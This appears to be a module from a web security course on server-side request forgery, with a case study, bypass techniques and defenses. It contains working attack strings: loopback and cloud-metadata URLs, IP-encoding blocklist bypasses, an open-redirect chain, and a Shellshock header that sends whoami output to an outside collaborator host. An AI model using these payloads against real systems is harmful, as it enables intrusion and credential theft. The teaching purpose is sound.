---
title: Server-Side Request Forgery (SSRF) · Case File 16 (The Confused Deputy)
description: Uncover how servers are tricked into fetching forbidden internal URLs, learn how bypasses overcome naive IP blocklists, and explore defensive isolation.
---

# Server-Side Request Forgery (SSRF) · The Confused Deputy Investigation

<p class="wd-section-lede">Server-Side Request Forgery (SSRF) turns a web server into a "confused deputy." An attacker on the public internet cannot access private internal systems, backend databases, or cloud metadata services. However, the public-facing web server sits safely <em>inside</em> the corporate perimeter. If an application feature allows users to provide a URL for the server to fetch, an attacker can use the server as an internal proxy to explore and control the private network.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Trusted Courier.</strong> Imagine a heavily fortified corporate research campus protected by armed guards and biometric gates. You cannot walk past the front entrance. But right outside the gate is a courier window where anyone can hand in a pickup request: <em>"Please run across town to Joe’s Coffee and fetch an espresso."</em> The courier leaves, grabs the coffee, and brings it back to you. Now imagine you hand the courier a slip that says: <em>"Please walk into the basement vault in Building B and bring me the folder labeled Secret Schematics."</em> Because the courier wears an all-access security badge, interior security guards wave him right through the vault doors without asking any questions. In SSRF, the web server is that trusted courier.</p>
</div>

---

## Case File #16: The Internal Stock API

Let's investigate how a common store feature—checking warehouse stock—can be coerced into an internal network probe.

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You inspect the HTTP traffic when checking stock for a product. You notice the browser sends a POST parameter containing a complete URL pointing to a backend API:</p>
    <div class="language-http"><pre><code>POST /product/stock HTTP/1.1
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1</code></pre></div>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The public web server receives the <code>stockApi</code> parameter and passes it directly to an internal HTTP client library (such as cURL, Python <code>requests</code>, or Node.js <code>fetch</code>). The server makes an outbound HTTP GET request to that address:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Server HTTP Client</span>
        <span><span class="wd-code-input">Gold</span> = Target URL Parameter</span>
      </div>
      <span class="wd-code-dev">fetch(</span><span class="wd-code-input">"http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1"</span><span class="wd-code-dev">)</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>The server never verifies whether the destination URL is an external web page or a private internal resource. By replacing the value with an <Term id="ssrf-loopback">internal loopback</Term> address like <code>http://127.0.0.1/admin</code> or <code>http://169.254.169.254/latest/meta-data/</code>, you force the server to talk to itself or to internal cloud APIs. Because the request originates from <code>127.0.0.1</code> inside the server's private network, internal admin portals trust it without asking for a password!</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers implement strict destination validation. They resolve the domain name to an IP address, verify that the IP is not in any private or loopback range (like <code>127.0.0.0/8</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>, or <code>169.254.169.254</code>), and then connect directly to the validated IP to prevent DNS rebinding attacks.</p>
  </div>
</div>

### Visual Comparison: Public Microservice vs. Internal Administrative Interface

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer designed <code>stockApi</code> to talk exclusively to the store's dedicated warehouse inventory API running on <code>stock.weliketoshop.net</code>.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>An attacker changed the parameter to <code>http://localhost/admin/delete?username=carlos</code>. The server's HTTP client connected directly to its own local loopback interface, bypassed authentication, and deleted Carlos's account.</p>
  </div>
</div>

### Watch the Destination Transform Color by Color

See how modifying the URL parameter redirects the server's HTTP client into internal networks:

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Blue</span> = Backend Fetch Function</span>
    <span><span class="wd-code-input">Gold</span> = Injected Private Target</span>
  </div>
  <span class="wd-code-dev">http_client.get(</span><span class="wd-code-input">"http://192.168.0.68/admin"</span><span class="wd-code-dev">)</span>
</div>

---

## The 4-Stage Journey of an SSRF Request

Notice how the request crosses the external perimeter into the trusted internal zone:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. Attacker Request</strong>
    Sends <code>stockApi=http://127.0.0.1/admin</code> across public internet to Web App.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>2. Perimeter Check Passed</strong>
    Firewall accepts request because it is ordinary traffic directed at port 443.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. Server Outbound Call</strong>
    Application initiates a second connection directed at internal interface <code>127.0.0.1</code>.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>4. Intranet Trust</strong>
    Internal service receives request from <code>localhost</code> and grants administrative privileges.
  </div>
</div>

---

## Where Can the Server Reach? (Common Internal Targets)

When you discover an SSRF vector, there are three primary internal targets you should investigate:

1. **Local Loopback (`127.0.0.1` / `localhost`):**
   Services running locally on the same physical host that do not require authentication for local users (administrative endpoints, debugging consoles, Redis, local databases).
2. **Private Backend Networks (RFC 1918):**
   Other servers in the private subnet (e.g. `192.168.0.X` or `10.0.0.X`). Even if not exposed to the internet, you can sweep internal IP ranges to discover private dashboards and internal APIs.
3. **Cloud Instance Metadata (`169.254.169.254`):**
   A magical link-local address present on AWS, GCP, Azure, and DigitalOcean virtual machines. Querying `http://169.254.169.254/latest/meta-data/` on AWS can yield temporary IAM credentials, security tokens, and infrastructure secrets.

<LabGroup ids="ssrf-lab-basic-ssrf-against-localhost, ssrf-lab-basic-ssrf-against-backend-system" />

---

## Blind SSRF: Hunting with Out-of-Band Interaction (OAST)

In many real-world scenarios, the server fetches the URL you provide, but never returns the response body on the screen. It might use the fetched resource internally (such as parsing analytics, rendering an avatar, or firing a webhook).

To verify the vulnerability, you use **Out-of-Band Application Security Testing (OAST)**:
1. Supply a domain you control (such as a unique Burp Collaborator address) as the target URL: `http://subdomain.burpcollaborator.net`.
2. Monitor your Collaborator listener.
3. If the server makes an HTTP request or DNS resolution back to your server, you have confirmed that the backend executes outbound requests under your control.

<LabGroup ids="ssrf-lab-out-of-band-detection" />

---

## Bypassing Naive Blacklist Filters

Developers often attempt to stop SSRF by checking if the user's input contains words like `127.0.0.1`, `localhost`, or `admin`. String-based blocklists are notoriously brittle because IP addresses and hostnames have many alternate representations:

| Input | Format | How the System Resolves It |
| --- | --- | --- |
| `127.0.0.1` | Standard dotted decimal | Standard loopback address |
| `127.1` | Shortened dotted decimal (`inet_aton`) | The OS expands `127.1` directly to `127.0.0.1` |
| `2130706433` | 32-bit Integer / Decimal | The entire 4-byte address represented as a decimal integer |
| `0x7f000001` | Hexadecimal | Hex representation of `127.0.0.1` |
| `[::1]` | IPv6 Loopback | The IPv6 equivalent of localhost |
| `127.0.0.1.nip.io` | Wildcard DNS service | A public domain name configured to resolve to `127.0.0.1` |

::: details 🔬 Under the Hood: Why `127.1` Works in Almost Every Network Stack
The standard POSIX networking library function `inet_aton` (which parses IPv4 addresses) supports several historical shorthand formats:
- 4 parts (`a.b.c.d`): Standard format.
- 3 parts (`a.b.c`): `c` is treated as a 16-bit number placed in the last two bytes (`a.b.0.c`).
- 2 parts (`a.b`): `b` is treated as a 24-bit number placed in the last three bytes (`a.0.0.b`). Therefore, `127.1` means `127.0.0.1`!
- 1 part (`a`): `a` is stored as a 32-bit integer. `2130706433` corresponds to `(127 << 24) + 1 = 127.0.0.1`.

A string filter looking for `"127.0.0.1"` sees none of these variations, yet the networking stack connects to loopback every single time.
:::

<LabGroup ids="ssrf-lab-ssrf-with-blacklist-filter" />

---

## Bypassing Whitelist Filters & Open Redirection

Allow-lists (whitelists) are far more secure than blocklists, but they can still be defeated when the validation parser and the HTTP client interpret URLs differently:

### 1. URL Parser Discrepancies
- **Userinfo Credentials (`@`):** In `https://expected-host.com@attacker.com`, standard URL specifications state that `expected-host.com` is a username, and `attacker.com` is the actual destination host. If a weak regex only checks if the string starts with `https://expected-host.com`, the check is bypassed.
- **Fragment and Query Identifiers (`#` and `?`):** `https://attacker.com#expected-host.com` or `https://attacker.com?expected-host.com`.
- **Subdomain Trickery:** `https://expected-host.com.attacker.com`.

### 2. Chaining SSRF with Open Redirection
If the application strictly verifies that the URL begins with `https://allowed-domain.com`, look for an **Open Redirection** vulnerability on that allowed domain:

```http
stockApi=https://allowed-domain.com/oauth/callback?redirect_url=http://192.168.0.68/admin
```

1. The validation check verifies that `stockApi` points to `allowed-domain.com`. The check passes!
2. The server's HTTP client connects to `allowed-domain.com`.
3. The server receives a `302 Found` redirect header pointing to `http://192.168.0.68/admin`.
4. The HTTP client automatically follows the redirect straight into the internal network!

<LabGroup ids="ssrf-lab-ssrf-filter-bypass-via-open-redirection, ssrf-lab-ssrf-with-whitelist-filter" />

---

## Escalating SSRF to RCE: Shellshock

SSRF is not just for reading files; it can be used to deliver active exploits to unpatched internal systems. 

For instance, if an internal backend system runs legacy CGI scripts vulnerable to **Shellshock** (CVE-2014-6271), an attacker can use SSRF to send an HTTP request to that internal endpoint with a crafted `User-Agent` header containing a Bash function definition:

```http
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).burpcollaborator.net
```

When the internal web server invokes the CGI script, Bash parses the environment variable and executes the command, escalating a simple request forgery into full Remote Code Execution (RCE).

<LabGroup ids="ssrf-lab-shellshock-exploitation" />

::: details ⚙️ Engine Variations: How URL Parsers Disagree
Different languages parse edge-case URLs differently:
- **Python `urllib.parse`:** Historically parsed URLs with backslashes and port notations differently from modern browsers.
- **Java `java.net.URL` vs `java.net.URI`:** `URL` handles certain malformed credential syntaxes that cause `URI` to throw an exception.
- **cURL:** By default supports non-HTTP protocols such as `gopher://`, `dict://`, `file://`, and `ldap://`. Restricting protocols using `--proto =http,https` is essential.
:::

---

## Defensive Blueprint: Building an Airtight SSRF Defense

Securing an application against SSRF requires defense-in-depth across the network and application layers:

<div class="wd-callout wd-callout--warn">
<p><strong>🛡️ The 4 Pillars of SSRF Prevention:</strong></p>
<ol>
  <li><strong>Resolve and validate before connecting:</strong> Never rely on string checks. Parse the URL, resolve the hostname to its IP address via DNS, and verify that the resolved IP does not belong to loopback (<code>127.0.0.0/8</code>), private ranges (RFC 1918), or link-local ranges (<code>169.254.0.0/16</code>).</li>
  <li><strong>Pin the connection (Prevent DNS Rebinding):</strong> Connect directly to the validated IP address rather than re-resolving the hostname, ensuring an attacker cannot change the DNS record between the check and the connection.</li>
  <li><strong>Disable automatic redirects:</strong> If the client must follow redirects, ensure every redirected hop passes through the same IP validation pipeline.</li>
  <li><strong>Harden cloud metadata services:</strong> Enforce <strong>IMDSv2</strong> on AWS instances, which requires a pre-negotiated session token via a <code>PUT</code> request with custom headers, neutralizing simple SSRF GET requests.</li>
</ol>
</div>

<TopicComplete topic-id="server-side-request-forgery-ssrf" label="Mark SSRF complete" />
